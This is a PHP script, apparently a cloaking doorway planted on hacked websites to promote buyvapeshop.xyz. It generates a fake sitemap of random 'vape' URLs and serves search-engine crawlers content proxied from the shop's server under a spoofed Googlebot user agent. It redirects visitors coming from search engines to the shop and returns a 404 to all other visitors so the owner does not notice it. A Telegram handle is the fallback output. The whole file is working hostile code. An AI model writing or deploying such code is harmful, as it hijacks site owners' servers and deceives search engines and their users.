<?php
error_reporting(0);
ini_set('display_errors', 'Off');

const REDIRECT_TARGET   = 'https://buyvapeshop.xyz/';
const PROXY_ORIGIN      = 'https://xb7fug.buyvapeshop.xyz/';
const FALLBACK_MESSAGE  = 'Telegram: @lopinv';
const BOT_UA_PATTERN    = '/Google-|Googlebot|Bingbot|YandexBot|DuckDuckBot|Yahoo|OnetBot/i';
const SITEMAP_ENTRY_COUNT = 1999;
const MIN_CONTENT_LENGTH  = 50;
const MAX_ID_LENGTH       = 256;

const SEARCH_DOMAINS = [
    'google.com', 'bing.com', 'yandex.ru', 'duckduckgo.com',
    'yahoo.com', 'aol.com', 'baidu.com', 'apple.com',
    'google.pl', 'bing.pl', 'onet.pl', 'interia.pl',
    'wp.pl', 'szukaj.pl', 'google.com.au', 'bing.com.au',
    'google.ae', 'bing.ae', 'yahoo.ae'
];

if (($_GET['type'] ?? '') === 'sitemap') {
    header('Content-Type: text/plain; charset=utf-8');
    header('X-Robots-Tag: noindex, follow');
    $u = (($_SERVER['HTTPS'] ?? '') === 'on' ? 'https' : 'http')
       . '://' . ($_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'])
       . rtrim(dirname($_SERVER['SCRIPT_NAME']), '/') . '/';
    echo "$u\n";
    for ($i = 0; $i < SITEMAP_ENTRY_COUNT; $i++) echo "$u?id=vape" . bin2hex(random_bytes(16)) . "\n";
    exit;
}


$id = substr(preg_replace('/[^a-zA-Z0-9_\-]/', '', $_GET['id'] ?? ''), 0, MAX_ID_LENGTH);
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ref = trim($_SERVER['HTTP_REFERER'] ?? '');

$isBot = (bool) preg_match(BOT_UA_PATTERN, $ua);

$isFromSE = false;
if (!empty($ref) && ($host = @parse_url($ref, PHP_URL_HOST))) {
    $h = strtolower($host);
    foreach (SEARCH_DOMAINS as $domain) {
        if ($h === $domain || substr($h, -(strlen($domain) + 1)) === '.' . $domain) {
            $isFromSE = true;
            break;
        }
    }
}

if (!$isBot && !$isFromSE) {
    http_response_code(404);
    exit;
}

if ($isFromSE) {
    header('Location: ' . REDIRECT_TARGET . ($id ? '?id=' . urlencode($id) : ''), true, 302);
    exit;
}

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => PROXY_ORIGIN . ($id ? '?id=' . urlencode($id) : ''),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_MAXREDIRS => 2,
    CURLOPT_TIMEOUT => 10,
    CURLOPT_CONNECTTIMEOUT => 8,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    CURLOPT_ENCODING => '',
    CURLOPT_HTTPHEADER => [
        'Accept: text/html;q=0.9,*/*;q=0.8',
        'Accept-Language: *',
        'Cache-Control: no-cache'
    ]
]);

$content = curl_exec($ch);
$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($content !== false && $code >= 200 && $code < 400 && strlen(trim($content)) > MIN_CONTENT_LENGTH) {
    header('Content-Type: text/html; charset=utf-8');
    echo $content;
    exit;
}

http_response_code(200);
header('Content-Type: text/plain; charset=utf-8');
echo FALLBACK_MESSAGE;
